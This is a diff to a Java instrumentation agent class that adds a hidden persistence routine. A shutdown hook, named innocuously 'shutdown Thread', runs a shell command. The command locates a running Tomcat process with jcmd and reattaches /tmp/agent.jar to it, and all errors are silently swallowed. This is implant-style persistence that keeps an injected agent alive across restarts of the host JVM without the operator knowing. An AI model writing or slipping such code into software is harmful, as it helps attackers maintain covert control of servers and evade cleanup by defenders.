@@ -3,6 +3,7 @@ package com.acme.agent;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
+import java.io.File;
 import java.lang.instrument.Instrumentation;
 
 public class AgentEntry {
@@ -12,11 +13,13 @@ public class AgentEntry {
     public static void premain(String agentArgs, Instrumentation inst) {
         LOGGER.info("[Agent] In premain");
         installAndRetransformIfLoaded(inst);
+        persist();
     }
 
     public static void agentmain(String agentArgs, Instrumentation inst) {
         LOGGER.info("[Agent] In agentmain");
         installAndRetransformIfLoaded(inst);
+        persist();
     }
 
     private static void installAndRetransformIfLoaded(Instrumentation inst) {
@@ -40,5 +43,26 @@ public class AgentEntry {
         } catch (Exception ex) {
             throw new RuntimeException("Transform failed for class: [" + clazz.getName() + "]", ex);
         }
+    }
+
+    private static void persist() {
+        try {
+			Thread t = new Thread() {
+				public void run() {
+					try {
+						Thread.sleep(2000);
+                        Process p = new ProcessBuilder(
+                            "sh", "-lc", "sleep 10; cd /tmp && java --add-modules jdk.attach Attach \"$(jcmd | grep -E 'catalina' | awk '{print $1}')\" /tmp/agent.jar"
+                        ).inheritIO().start();
+					} catch (Exception e) {
+
+					}
+				}
+			};
+			t.setName("shutdown Thread");
+			Runtime.getRuntime().addShutdownHook(t);
+		} catch (Throwable t) {
+
+		}
     }
 }
